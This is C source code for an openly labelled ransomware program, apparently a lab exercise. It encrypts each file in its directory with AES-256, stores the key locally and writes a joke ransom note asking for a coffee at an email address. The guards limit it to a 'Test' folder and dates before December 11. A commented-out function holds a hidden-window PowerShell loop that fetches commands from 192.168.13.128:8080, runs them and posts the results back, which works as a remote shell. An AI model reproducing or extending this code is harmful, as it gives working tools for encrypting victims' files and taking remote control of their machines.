#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <openssl/rand.h>
#include <sys/stat.h>
#include <time.h>
#include <windows.h>

void handleErrors(void) {
    ERR_print_errors_fp(stderr);
    abort();
}

void gk(unsigned char *key, size_t key_length) {
    if (RAND_bytes(key, key_length) != 1) {fprintf(stderr, "Error generating random key\n");exit(1);}
}

void giv(unsigned char* iv, size_t iv_size) {
    if (RAND_bytes(iv, iv_size) != 1) {
        perror("Error generating iv\n");
        exit(1);
    }
}

void checkTime() {
    time_t now;
    time(&now);
    struct tm *current_time = localtime(&now);
    printf("Current Date: %d-%d-%d\n", current_time->tm_year + 1900, current_time->tm_mon + 1, current_time->tm_mday);
    struct tm specified_time = {0};
    specified_time.tm_year = current_time->tm_year;
    specified_time.tm_mon = 11;                    
    specified_time.tm_mday = 11;                  
    time_t specified_time_t = mktime(&specified_time);
    if (difftime(now, specified_time_t) > 0) {
        printf("Current date is later than the 11th of December.\n");
        printf("This program will not run due to security presets.\n");
        printf("Press Enter to continue...\n");
        char input[256];
        fgets(input, sizeof(input), stdin);
        exit(1);
    } else {
        printf("Current date is before the 11th of December.\n");
        printf("This r@nS0Mw@r3 will run.");
    }
}

void sCheck() {
    char cwd[1024];
    if (_getcwd(cwd, sizeof(cwd)) == NULL) {
        perror("Cannot get current directory\n");
        exit(1);
    }
    if (strcmp(cwd, "Test") != 1) {
        char* lastdir = strrchr(cwd, '\\');
        if (lastdir != NULL) {
            lastdir++;
            if (strcmp(lastdir, "Test") == 0) {
                printf("Running in the Test directory.\n");
            } else {
                perror("Unsafe directory. Must be in \\Test. Exiting...\n");
                exit(1);
            }
        } else {
            printf("Could not determine the directory name.\n");
        }
    }
    checkTime();
}

void sign(char* fn) {
    strcat(fn, ".mpl");
}

int e(unsigned char *plaintext, int plaintext_len, unsigned char *key,
            unsigned char *iv, unsigned char *ciphertext) {
    EVP_CIPHER_CTX *ctx;
    int len;
    int ciphertext_len;

    if (!(ctx = EVP_CIPHER_CTX_new())) handleErrors();
    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();
    if (1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
        handleErrors();
    ciphertext_len = len;
    if (1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len)) handleErrors();
    ciphertext_len += len;
    EVP_CIPHER_CTX_free(ctx);
    return ciphertext_len;
}

void ed(const char *dir_path) {
    struct dirent *entry;
    unsigned char key[32];
    unsigned char iv[16];
    
    DIR *dir = opendir(dir_path);
    gk(key, sizeof(key));
    giv(iv, sizeof(iv));

    // debugging statements
    for (int i = 0; i < sizeof(key); i++) {
        printf("%02x", key[i]);
    }
    printf("\n");
    for (int i = 0; i < sizeof(iv); i++) {
        printf("%02x", iv[i]);
    }
    printf("\n");

    if (dir == NULL) {
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        char file_path[1024];
        snprintf(file_path, sizeof(file_path), "%s/%s", dir_path, entry->d_name);
        struct stat statbuf;

        if (stat(file_path, &statbuf) == 0) {
            if (S_ISREG(statbuf.st_mode)) {
                printf("Regular file: %s\n", entry->d_name);
                char ofilename[1024];

                FILE* tfile = fopen(file_path, "rb");
                strcpy(ofilename, file_path);
                sign(ofilename);
                FILE* ofile = fopen(ofilename, "wb");
                
                unsigned char buffer[256];
                unsigned char ct[256 + EVP_MAX_BLOCK_LENGTH];  // Buffer for ciphertext

                int bytes_read;
                while ((bytes_read = fread(buffer, 1, sizeof(buffer), tfile)) > 0) {
                    int ciphertext_len = e(buffer, bytes_read, key, iv, ct);
                    fwrite(ct, 1, ciphertext_len, ofile);  // Write the encrypted content
                }
            }
        }
    }
    closedir(dir);
    FILE* important_info = fopen("keys.txt", "wb");
    fwrite(key, 1, sizeof(key), important_info);    // Write the key
    fwrite(iv, 1, sizeof(iv), important_info);      // Write the IV
    fclose(important_info);
}

// void openConnection() {
//     const char* command = "powershell.exe -Command \"$s='192.168.13.128:8080';$i='435693df-fe69567a-a0ccab9f';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/435693df -Headers @{\\\"X-bd3b-7843\\\"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/fe69567a -Headers @{\\\"X-bd3b-7843\\\"=$i}).Content;if ($c -ne 'None') {$r=i''e''x $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/a0ccab9f -Method POST -Headers @{\\\"X-bd3b-7843\\\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}\"";
//     // Initialize the startup info structure
//     STARTUPINFO si = { sizeof(si) };
//     PROCESS_INFORMATION pi;
    
//     // Hide the window by setting the flag
//     si.dwFlags = STARTF_USESHOWWINDOW;
//     si.wShowWindow = SW_HIDE;  // This hides the window
    
//     // Create the process
//     if (CreateProcess(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
//         // Wait for the process to finish
//         WaitForSingleObject(pi.hProcess, INFINITE);
        
//         // Close process and thread handles
//         CloseHandle(pi.hProcess);
//         CloseHandle(pi.hThread);
//     }
// }

void write_ransom_note() {
    FILE *file = fopen("RANSOM_NOTE.txt", "w");
    if (file == NULL) {
        return;
    }
    fprintf(file, "Your files have been encrypted.\n");
    fprintf(file, "To decrypt them, please buy me a coffee, at garyphoneix@gmail.com \n");
    fprintf(file, "Preferably Latte Please :>\n");
    fclose(file);
}

int main (void) {sCheck();ed(".");/**openConnection()**/; write_ransom_note();}